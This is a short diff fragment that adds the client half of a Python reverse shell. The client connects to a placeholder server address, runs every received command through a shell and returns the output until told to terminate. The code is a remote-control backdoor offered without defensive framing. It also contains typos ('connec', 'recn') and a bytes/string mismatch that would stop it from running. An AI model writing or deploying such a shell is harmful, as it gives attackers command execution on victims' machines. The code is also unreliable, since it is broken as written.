@@ -43,3 +43,36 @@ if __name__=='__main__':
     
     
 ======= Client ======
+
+import socket
+import subprocess
+
+
+def get_connection():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connec(('SERVER NAME/IP', SERVER_PORT))
+    
+    while 1:
+        command = s.recn(1024)
+        
+        if 'terminate' in command:
+            s.close()
+            break
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send( CMD.stdout.read() )
+            s.send( CMD.stderr.read() )
+            
+def main():
+        get_connection()
+ 
+
+if __name__=='__main__':
+    main()
+    
+ =====================   
+
+        
+        
+            
+            
